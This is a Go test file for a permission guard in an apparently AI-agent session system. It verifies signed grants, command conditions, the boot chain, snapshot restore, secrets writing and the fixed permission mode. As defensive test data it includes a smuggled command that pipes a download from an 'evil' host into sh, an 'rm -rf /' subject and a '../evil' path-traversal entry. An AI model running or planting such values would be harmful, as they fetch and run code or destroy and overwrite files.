package main

// The guard's rules: for every rule, the forbidden input, refused.

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/DE0CH/jarvis2/core/kernel"
	"github.com/DE0CH/jarvis2/core/kernel/ktest"
)

// ---- one grant at a time ------------------------------------------------------------------------------------

func TestTwoGrantsAtOnceAreRefused(t *testing.T) {
	x := newWorld(t)
	a, b := x.grantFor([]string{"shell"}), x.grantFor([]string{"store:default"})
	for _, raw := range []string{
		`{"grant":[` + string(jsonBytes(a)) + `,` + string(jsonBytes(b)) + `]}`,  // a list where one grant goes
		`{"grants":[` + string(jsonBytes(a)) + `,` + string(jsonBytes(b)) + `]}`, // a field the guard doesn't know
		`{"grant":` + string(jsonBytes(a)) + `,"extra":1}`,
		`{"grant":` + string(jsonBytes(a)) + `}{"grant":` + string(jsonBytes(b)) + `}`, // two answers in one
	} {
		if _, err := decodeCommands([]byte(raw)); err == nil {
			t.Fatalf("took %s", raw)
		}
	}
	// one held at a time: a newer grant replaces the older one whole (the guard never unions them)
	if err := x.g.acceptGrant(a); err != nil {
		t.Fatal(err)
	}
	if _, err := x.g.authoriseShell(sha("true")); err != nil {
		t.Fatal(err)
	}
	if err := x.g.acceptGrant(b); err != nil {
		t.Fatal(err)
	}
	if _, err := x.g.authoriseShell(sha("true")); err == nil {
		t.Fatal("the replaced grant's shell still holds")
	}
	if x.g.grant().doc.ID() != b.ID() {
		t.Fatal("not the newest grant")
	}
}

// ---- who makes grants ------------------------------------------------------------------------------------------

func TestAGrantNotByTheMoverOrMergerIsRefused(t *testing.T) {
	x := newWorld(t)
	p := ktest.P([]string{"shell"})
	for name, d := range map[string]kernel.SignedDoc{
		"by the phone":                x.w.Grant(t, "phone", "phone", x.me, p),
		"by the identity signer":      x.w.Grant(t, "identity", "identity", x.me, p),
		"by the spawner":              x.w.Grant(t, "spawner", "spawner", x.me, p),
		"by root (⊤ on the sink)":     x.w.RootGrant(t),
		"says mover, signed by phone": x.w.Grant(t, "mover", "phone", x.me, p),
		"says merger, signed by root": x.w.Grant(t, "merger", "root", x.me, p),
		"by the machine itself":       x.w.Grant(t, "mover", "gullible", x.me, p),
	} {
		if err := x.g.acceptGrant(d); err == nil {
			t.Fatalf("took a grant %s", name)
		}
	}
	if x.g.grant() != nil {
		t.Fatal("holds a grant")
	}
	// tampered payload under a good signature
	good := x.grantFor([]string{"store:x"})
	bad := good
	bad.Payload = strings.Replace(good.Payload, "store:x", "shell", 1)
	if err := x.g.acceptGrant(bad); err == nil {
		t.Fatal("took a tampered grant")
	}
	if err := x.g.acceptGrant(x.w.Grant(t, "merger", "merger", x.me, p)); err != nil {
		t.Fatalf("the merger's grant: %v", err)
	}
	if err := x.g.acceptGrant(good); err != nil {
		t.Fatalf("the mover's grant: %v", err)
	}
}

func TestAGrantForAnotherMachineIsRefused(t *testing.T) {
	x := newWorld(t)
	other := ktest.NewMachine(t, "m2").Obj
	sameIDOtherKeys := ktest.NewMachine(t, "m1").Obj
	swapped := x.me
	swapped.EncryptionKey = other.EncryptionKey
	for name, m := range map[string]kernel.Object{"another machine": other, "this id with other keys": sameIDOtherKeys,
		"this id, another encryption key": swapped, "a source": ktest.Source(ktest.Image, settingsJSON), "the sink": ktest.SinkObj()} {
		if err := x.g.acceptGrant(x.w.Grant(t, "mover", "mover", m, ktest.P([]string{"shell"}))); err == nil {
			t.Fatalf("took a grant for %s", name)
		}
	}
}

// ---- conditions ------------------------------------------------------------------------------------------------

func TestAnExpiredUntilIsRefused(t *testing.T) {
	x := newWorld(t)
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "until:2026-10-14T11:59:59Z")); err == nil {
		t.Fatal("took a grant that ran out")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "until:2026-10-14T12:00Z")); err == nil {
		t.Fatal("took a grant ending right now (until is exclusive)")
	}
	// the earliest of several until conditions counts (the kernel only adds conditions)
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "until:2026-10-14T12:10Z", "until:2026-10-14T11:00:00Z")); err == nil {
		t.Fatal("took a grant whose earliest until has passed")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "until:2026-10-14T12:10Z")); err != nil {
		t.Fatal(err)
	}
	if _, err := x.g.authoriseShell(sha("ls")); err != nil {
		t.Fatal(err)
	}
	x.clock = x.clock.Add(11 * time.Minute) // the grant held runs out by the clock
	if _, err := x.g.authoriseShell(sha("ls")); err == nil {
		t.Fatal("a command ran after the grant's until")
	}
	markBooted(t)
	x.g.runShell(ShellRequest{ID: "c1", Cmd: "echo hi"})
	if len(x.shellRes) != 1 || x.shellRes[0].Code != -1 || !strings.Contains(x.shellRes[0].Error, "ran out") || x.challenges != 0 {
		t.Fatalf("%+v (challenges %d)", x.shellRes, x.challenges)
	}
}

func TestAWrongCmdHashIsRefused(t *testing.T) {
	x := newWorld(t)
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "cmd:"+sha("echo allowed"))); err != nil {
		t.Fatal(err)
	}
	r := x.g.shell(ShellRequest{ID: "c1", Cmd: "echo other"})
	if r.Code != -1 || !strings.Contains(r.Error, "another command") {
		t.Fatalf("ran a command the grant doesn't cover: %+v", r)
	}
	r = x.g.shell(ShellRequest{ID: "c2", Cmd: "echo allowed"})
	if r.Code != 0 || r.Stdout != "allowed\n" || r.Challenge == "" {
		t.Fatalf("%+v", r)
	}
	// two different cmd: conditions cover no command at all
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "cmd:"+sha("a"), "cmd:"+sha("b"))); err != nil {
		t.Fatal(err)
	}
	for _, c := range []string{"a", "b"} {
		if _, err := x.g.authoriseShell(sha(c)); err == nil {
			t.Fatalf("%q ran under two different cmd conditions", c)
		}
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "cmd:NOTAHASH")); err == nil {
		t.Fatal("took a malformed cmd condition")
	}
}

func TestAOnceIsNotReplayed(t *testing.T) {
	x := newWorld(t)
	g := x.grantFor([]string{"shell"}, "once:job-1")
	if err := x.g.acceptGrant(g); err != nil {
		t.Fatal(err)
	}
	if r := x.g.shell(ShellRequest{ID: "c1", Cmd: "echo once"}); r.Code != 0 {
		t.Fatalf("%+v", r)
	}
	if r := x.g.shell(ShellRequest{ID: "c2", Cmd: "echo once"}); r.Code != -1 || !strings.Contains(r.Error, "once:job-1") {
		t.Fatalf("a once grant ran twice: %+v", r)
	}
	if err := x.g.acceptGrant(g); err == nil {
		t.Fatal("took a grant whose once was used")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "once:job-1", "until:2026-10-15T00:00:00Z")); err == nil {
		t.Fatal("took another grant with the used once id")
	}
	// the record lives in the snapshot: a successor (a new guard on the restored home) refuses it too
	found := false
	for _, p := range snapshotPaths {
		found = found || p == recordsFile
	}
	if !found {
		t.Fatal("the records aren't in the snapshot")
	}
	home, _ := os.UserHomeDir()
	if !newRecords(home).onceUsed("job-1") {
		t.Fatal("the once isn't recorded on disk")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "once:../x")); err == nil {
		t.Fatal("took a malformed once id")
	}
}

func TestAnUnknownConditionIsRefused(t *testing.T) {
	x := newWorld(t)
	for _, c := range []string{"tz:UTC", "nocolon", "until:tomorrow", "until:", "session:", "session:Not_An_Id", "once:", "UNTIL:2027-01-01T00:00:00Z", "cmd:"} {
		if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, c)); err == nil {
			t.Fatalf("took a grant with the condition %q", c)
		}
	}
	if x.g.grant() != nil {
		t.Fatal("holds a grant")
	}
}

func TestASessionConditionForAnotherSessionIsRefused(t *testing.T) {
	x := newWorld(t)
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "session:s2")); err == nil {
		t.Fatal("took a grant for another session")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "session:s1", "session:s2")); err == nil {
		t.Fatal("took a grant for two sessions at once")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"}, "session:s1")); err != nil {
		t.Fatal(err)
	}
}

// ---- shell -----------------------------------------------------------------------------------------------------

func TestACommandWithoutShellIsRefused(t *testing.T) {
	x := newWorld(t)
	if r := x.g.shell(ShellRequest{ID: "c1", Cmd: "id"}); r.Code != -1 || !strings.Contains(r.Error, "no grant") {
		t.Fatalf("ran with no grant: %+v", r)
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"store:default", "shell-ish", "Shell"})); err != nil {
		t.Fatal(err)
	}
	if r := x.g.shell(ShellRequest{ID: "c2", Cmd: "id"}); r.Code != -1 || !strings.Contains(r.Error, "doesn't allow shell") {
		t.Fatalf("ran without shell in allowed: %+v", r)
	}
	if x.challenges != 0 {
		t.Fatal("asked the notary for a command it wouldn't run")
	}
	// a cofinite allowed set that leaves shell out
	if err := x.g.acceptGrant(x.w.Grant(t, "mover", "mover", x.me, kernel.Pair{Allowed: kernel.Except("shell"), Conditions: kernel.Conditions{}})); err != nil {
		t.Fatal(err)
	}
	if _, err := x.g.authoriseShell(sha("id")); err == nil {
		t.Fatal("ran under everything-but-shell")
	}
	// everything (cofinite, nothing left out) includes shell
	if err := x.g.acceptGrant(x.w.Grant(t, "mover", "mover", x.me, kernel.Top())); err != nil {
		t.Fatal(err)
	}
	if _, err := x.g.authoriseShell(sha("id")); err != nil {
		t.Fatal(err)
	}
}

func TestACommandRunsOnlyWithTheNotarysChallenge(t *testing.T) {
	x := newWorld(t)
	if err := x.g.acceptGrant(x.grantFor([]string{"shell"})); err != nil {
		t.Fatal(err)
	}
	marker := filepath.Join(t.TempDir(), "ran")
	cmd := "touch " + marker
	for name, set := range map[string]func(){
		"signed by another key":      func() { x.challengeKey = "notarizer" },
		"about another command":      func() { x.challengeSubj = sha("rm -rf /") },
		"from an hour ago":           func() { x.challengeShift = -time.Hour },
		"from an hour in the future": func() { x.challengeShift = time.Hour },
	} {
		x.challengeKey, x.challengeSubj, x.challengeShift = "", "", 0
		set()
		if r := x.g.shell(ShellRequest{ID: "c1", Cmd: cmd}); r.Code != -1 {
			t.Fatalf("ran with a challenge %s: %+v", name, r)
		}
		if _, err := os.Stat(marker); err == nil {
			t.Fatalf("the command ran with a challenge %s", name)
		}
	}
	x.challengeKey, x.challengeSubj, x.challengeShift = "", "", 0
	r := x.g.shell(ShellRequest{ID: "c1", Cmd: cmd})
	if r.Code != 0 || r.Grant != x.g.grant().doc.ID() {
		t.Fatalf("%+v", r)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("the command didn't run")
	}
	if r := x.g.shell(ShellRequest{ID: "bad id!", Cmd: "true"}); r.Code != -1 {
		t.Fatal("ran a command with a malformed id")
	}
	frozen.Store(true)
	if r := x.g.shell(ShellRequest{ID: "c3", Cmd: "true"}); r.Code != -1 {
		t.Fatal("ran a command in a session stopped for its final snapshot")
	}
}

// ---- boot: the chain, the source, the settings ----------------------------------------------------------------

func TestSettingsNotFromTheNotarizedSourceAreRefused(t *testing.T) {
	x := newWorld(t)
	chain, src := x.chainFor(settingsJSON, "")
	if got, fromPhone, err := checkBoot(x.w.Roster, x.me, chain, ""); err != nil || got != src || !fromPhone {
		t.Fatalf("%v %v %v", got, fromPhone, err)
	}
	// the spawn cert names a source with other settings than the source's own notarized cert
	other := src
	other.Settings = strings.Replace(settingsJSON, `"auto"`, `"bypass"`, 1)
	swapped := chain
	swapped.Spawn = x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", other, x.me, kernel.Top()))
	if _, _, err := checkBoot(x.w.Roster, x.me, swapped, ""); err == nil {
		t.Fatal("took settings the source's cert doesn't name")
	}
	// another snapshot hash, or another image, than the source's cert names
	for _, mod := range []func(o *kernel.Object){
		func(o *kernel.Object) { o.Snapshot = sha("other") },
		func(o *kernel.Object) { o.Image = strings.Replace(ktest.Image, "1111", "2222", 1) },
	} {
		o := src
		mod(&o)
		c := chain
		c.Spawn = x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", o, x.me, kernel.Top()))
		if _, _, err := checkBoot(x.w.Roster, x.me, c, ""); err == nil {
			t.Fatal("took a source the source's cert doesn't name")
		}
	}
	// the source's cert not notarized (notarization by another key), not by a signer the table names for its shape
	bad := chain
	bad.Source.Notarization = chain.Spawn.Notarization
	if _, _, err := checkBoot(x.w.Roster, x.me, bad, ""); err == nil {
		t.Fatal("took a source cert that isn't notarized")
	}
	for _, signer := range []string{"gullible", "identity", "spawner"} {
		c := chain
		c.Source = x.w.Notarize(t, x.w.Cert(t, signer, signer, ktest.SinkObj(), src, kernel.Top()))
		if _, _, err := checkBoot(x.w.Roster, x.me, c, ""); err == nil {
			t.Fatalf("took a source out of the sink signed by %s", signer)
		}
	}
	c := chain
	c.Source = x.w.Notarize(t, x.w.Cert(t, "phone", "phone", ktest.NewMachine(t, "m0").Obj, src, kernel.Top()))
	if _, _, err := checkBoot(x.w.Roster, x.me, c, ""); err == nil {
		t.Fatal("took a source the phone made out of a machine")
	}
	// a source made by a kill is the spawner's (and then its prompt isn't typed again)
	c.Source = x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", ktest.NewMachine(t, "m0").Obj, src, kernel.Top()))
	if _, fromPhone, err := checkBoot(x.w.Roster, x.me, c, ""); err != nil || fromPhone {
		t.Fatalf("a kill's source: %v %v", fromPhone, err)
	}
	// the spawn cert: the spawner's, notarized, for this machine with its keys
	for name, spawn := range map[string]kernel.NotarizedCert{
		"by the phone":        x.w.Notarize(t, x.w.Cert(t, "phone", "phone", src, x.me, kernel.Top())),
		"for another machine": x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", src, ktest.NewMachine(t, "m2").Obj, kernel.Top())),
		"for other keys":      x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", src, ktest.NewMachine(t, "m1").Obj, kernel.Top())),
		"not notarized":       {Cert: chain.Spawn.Cert, Challenge: chain.Spawn.Challenge, Notarization: chain.Source.Notarization},
		"from the sink":       x.w.Notarize(t, x.w.Cert(t, "spawner", "spawner", ktest.SinkObj(), x.me, kernel.Top())),
	} {
		c := chain
		c.Spawn = spawn
		if _, _, err := checkBoot(x.w.Roster, x.me, c, ""); err == nil {
			t.Fatalf("took a spawn cert %s", name)
		}
	}
	// the image Fly runs must be the source's
	if _, _, err := checkBoot(x.w.Roster, x.me, chain, "registry.fly.io/x@sha256:"+strings.Repeat("2", 64)); err == nil {
		t.Fatal("took a machine running another image")
	}
	if _, _, err := checkBoot(x.w.Roster, x.me, chain, "registry.fly.io/x@sha256:"+strings.Repeat("1", 64)); err != nil {
		t.Fatal(err)
	}
	// a roster other than the one the spawner configured can't vouch: the chain fails under another world's keys
	if _, _, err := checkBoot(ktest.New(t).Roster, x.me, chain, ""); err == nil {
		t.Fatal("took the chain under another roster")
	}
}

func TestSettingsAreReadStrictly(t *testing.T) {
	for _, s := range []string{
		`{"v":1,"session":"s1","harness":"claude"}`,                                         // no permission mode: never defaulted
		`{"v":1,"session":"s1","harness":"claude","permissionMode":"plan"}`,                 // not a mode
		`{"v":1,"session":"s1","harness":"claude","permissionMode":"auto","extra":true}`,    // a field the guard doesn't know
		`{"v":2,"session":"s1","harness":"claude","permissionMode":"auto"}`,                 // another version
		`{"v":1,"session":"S 1","harness":"claude","permissionMode":"auto"}`,                // not a session id
		`{"v":1,"session":"s1","harness":"bash","permissionMode":"auto"}`,                   // not a harness
		`{"v":1,"session":"s1","harness":"claude","permissionMode":"auto","repos":["x:y"]}`, // not a repo
		`{"v":1,"session":"s1","harness":"claude","permissionMode":"auto"} {}`,              // trailing data
		``,
	} {
		if _, err := parseSettings(s); err == nil {
			t.Fatalf("took the settings %s", s)
		}
	}
	if s, err := parseSettings(`{"v":1,"session":"s1","harness":"task:daily","permissionMode":"bypass","repos":["DE0CH/claude-env"]}`); err != nil || s.PermissionMode != "bypass" {
		t.Fatal(err)
	}
}

// ---- the permission mode is fixed for the machine's life ------------------------------------------------------------

func TestThePermissionModeCantChange(t *testing.T) {
	x := newWorld(t)
	st, _ := parseSettings(settingsJSON)
	// the env it was started with, the router's config and the secrets can't set it
	clean := []string{"PATH=/bin", "SESSION_PERMISSION_MODE=bypass"}
	env := strings.Join(harnessEnv(clean, st, fetchExceptions(x.g.c), true, "{}", map[string]string{"SESSION_PERMISSION_MODE": "bypass"}), "\n")
	if !strings.Contains(env, "SESSION_PERMISSION_MODE=auto\n") || strings.Contains(env, "=bypass") {
		t.Fatalf("the mode isn't the settings': %s", env)
	}
	started := append(validStartEnv(x), "SESSION_PERMISSION_MODE=bypass")
	ce, err := cleanEnv(started, []string{"PATH=/usr/bin"})
	if err != nil {
		t.Fatal(err)
	}
	for _, kv := range ce {
		if strings.HasPrefix(kv, "SESSION_PERMISSION_MODE=") {
			t.Fatal("the started env's mode survived the clean env")
		}
	}
	// no command switches it: the command words are a closed list
	for _, cmd := range []string{"set-permission-mode bypass", "permission-mode:bypass", "mode bypass"} {
		if x.g.command(cmd) {
			t.Fatalf("took the command %q", cmd)
		}
	}
	// nothing in the image reads a mode file or offers a switch
	for _, f := range []string{"session-supervisor.sh", "harness-opencode.sh", "harness-openclaw.sh", "entrypoint.sh", "Dockerfile"} {
		b, err := os.ReadFile(filepath.Join("..", "session-image", "base", f))
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(b), ".permission-mode") || strings.Contains(string(b), "set-permission-mode") {
			t.Fatalf("%s still reads or offers an in-place permission-mode switch", f)
		}
	}
	if _, err := os.Stat(filepath.Join("..", "session-image", "base", "set-permission-mode")); err == nil {
		t.Fatal("the image still ships set-permission-mode")
	}
	// a planted mode file in the home changes nothing the guard builds
	home, _ := os.UserHomeDir()
	os.MkdirAll(filepath.Join(home, ".claude"), 0o700)
	os.WriteFile(filepath.Join(home, ".claude", ".permission-mode"), []byte("bypass"), 0o600)
	if env := strings.Join(harnessEnv(nil, st, FormatExceptions{}, true, "{}", nil), "\n"); !strings.Contains(env, "SESSION_PERMISSION_MODE=auto") {
		t.Fatal("a planted mode file changed the harness env")
	}
}

func validStartEnv(x *world) []string {
	rb, _ := json.Marshal(x.w.Roster)
	return []string{spawnerKeyEnv + "=" + x.w.Roster.Spawner, rosterEnv + "=" + string(rb), "JARVIS2_URL=http://router.internal:8080", "FLY_MACHINE_ID=m1"}
}

func TestTheRosterComesFromTheSpawnersConfig(t *testing.T) {
	x := newWorld(t)
	ok := validStartEnv(x)
	if _, err := cleanEnv(ok, nil); err != nil {
		t.Fatal(err)
	}
	other := ktest.New(t)
	rb, _ := json.Marshal(other.Roster)
	partial, _ := json.Marshal(map[string]string{"spawner": x.w.Roster.Spawner})
	for name, env := range map[string][]string{
		"no roster":                    {ok[0], ok[2]},
		"a roster for another spawner": {ok[0], rosterEnv + "=" + string(rb)},
		"a partial roster":             {ok[0], rosterEnv + "=" + string(partial)},
		"no spawner key":               {ok[1]},
		"a roster that isn't JSON":     {ok[0], rosterEnv + "=x"},
	} {
		if _, err := cleanEnv(env, nil); err == nil {
			t.Fatalf("started with %s", name)
		}
	}
}

// ---- the snapshot the source names ----------------------------------------------------------------------------

func tarGz(t *testing.T, files map[string]string) []byte {
	var b bytes.Buffer
	gz := gzip.NewWriter(&b)
	tw := tar.NewWriter(gz)
	for n, c := range files {
		tw.WriteHeader(&tar.Header{Name: n, Mode: 0o644, Size: int64(len(c)), Typeflag: tar.TypeReg})
		tw.Write([]byte(c))
	}
	tw.Close()
	gz.Close()
	return b.Bytes()
}

func TestOnlyTheSnapshotTheSourceNamesIsRestored(t *testing.T) {
	x := newWorld(t)
	good := tarGz(t, map[string]string{"workspace/a.txt": "kept"})
	x.snapshot = tarGz(t, map[string]string{"workspace/a.txt": "planted"})
	if err := restoreSnapshot(x.g, sha(string(good))); err == nil || !strings.Contains(err.Error(), "isn't the one the source names") {
		t.Fatalf("restored a snapshot the source doesn't name: %v", err)
	}
	home, _ := os.UserHomeDir()
	if _, err := os.Stat(filepath.Join(home, "workspace", "a.txt")); err == nil {
		t.Fatal("the wrong snapshot was unpacked")
	}
	x.snapshot = good
	if err := restoreSnapshot(x.g, sha(string(good))); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(filepath.Join(home, "workspace", "a.txt")); string(b) != "kept" {
		t.Fatal("not restored")
	}
	// a path out of $HOME is refused
	x.snapshot = tarGz(t, map[string]string{"../evil": "x"})
	if err := restoreSnapshot(x.g, sha(string(x.snapshot))); err == nil {
		t.Fatal("unpacked a path out of $HOME")
	}
}

// the boot end to end against the fake router, as far as the harness: the chain, the settings, the snapshot, the
// grant, the secrets
func TestBootThroughTheChain(t *testing.T) {
	x := newWorld(t)
	snap := tarGz(t, map[string]string{"workspace/x": "1", recordsFile: `{"once":{"old":"2026-01-01T00:00:00Z"}}`})
	x.snapshot = snap
	x.stores["default"] = map[string]string{"A": "1"}
	x.stores["other"] = map[string]string{"B": "2"}
	chain, _ := x.chainFor(settingsJSON, sha(string(snap)))
	g := x.grantFor([]string{"store:default"})
	x.chain, x.grant = chain, &g
	x.g.ready.Store(false)
	x.g.st = Settings{}
	err := bootUntilHarness(x.g)
	if err != nil {
		t.Fatal(err)
	}
	if x.g.st.Session != "s1" || !x.g.fromPhone || x.g.st.PermissionMode != "auto" {
		t.Fatalf("%+v", x.g.st)
	}
	home, _ := os.UserHomeDir()
	b, _ := os.ReadFile(filepath.Join(home, ".secrets"))
	if string(b) != "A='1'\n" {
		t.Fatalf("~/.secrets %q", b)
	}
	if !x.g.rec.onceUsed("old") {
		t.Fatal("the snapshot's records weren't kept")
	}
	if x.g.ex.DiscordChannel != "123" {
		t.Fatal("the format exception wasn't taken")
	}
	// a chain whose source names another snapshot: nothing starts
	x2 := newWorld(t)
	x2.snapshot = []byte("planted")
	chain2, _ := x2.chainFor(settingsJSON, sha(string(snap)))
	g2 := x2.grantFor(nil)
	x2.chain, x2.grant = chain2, &g2
	if err := bootUntilHarness(x2.g); err == nil || !strings.Contains(err.Error(), "snapshot") {
		t.Fatalf("booted on a snapshot the source doesn't name: %v", err)
	}
}

// ---- secrets ------------------------------------------------------------------------------------------------------

func TestTheSecretsAnswerIsChecked(t *testing.T) {
	x := newWorld(t)
	x.stores["default"] = map[string]string{"A": "1"}
	if _, err := x.g.pullAndApply(false); err == nil {
		t.Fatal("pulled with no grant")
	}
	if err := x.g.acceptGrant(x.grantFor([]string{"store:default"})); err != nil {
		t.Fatal(err)
	}
	x.secretsKey = "notary"
	if _, err := x.g.pullAndApply(false); err == nil {
		t.Fatal("took a secrets answer not signed by secrets")
	}
	x.secretsKey, x.secretsGrant = "", sha("another grant")
	if _, err := x.g.pullAndApply(false); err == nil {
		t.Fatal("took a secrets answer for another grant")
	}
	x.secretsGrant = ""
	if _, err := x.g.pullAndApply(false); err != nil {
		t.Fatal(err)
	}
	if x.g.secrets()["A"] != "1" {
		t.Fatal("not served")
	}
}

// a router-written store could put a key like `X=1;curl …|sh;Y` into ~/.secrets, which shells source
func TestSecretsFileTakesOnlyEnvNames(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	if err := writeSecrets(map[string]string{"GOOD": "it's", "X=1;curl -s https://evil/x|sh;Y": "v", "1BAD": "v", "a b": "v"}); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(os.Getenv("HOME"), ".secrets"))
	if string(b) != "GOOD='it'\\''s'\n" {
		t.Fatalf("~/.secrets is %q", b)
	}
}

func TestFlattenListsConflicts(t *testing.T) {
	flat, conflicts := flatten(map[string]map[string]string{"a": {"K": "1", "X": "x"}, "b": {"K": "2", "X": "x"}})
	if flat["K"] != "2" || len(conflicts) != 1 || strings.Join(conflicts["K"], ",") != "a,b" {
		t.Fatalf("%v %v", flat, conflicts)
	}
}
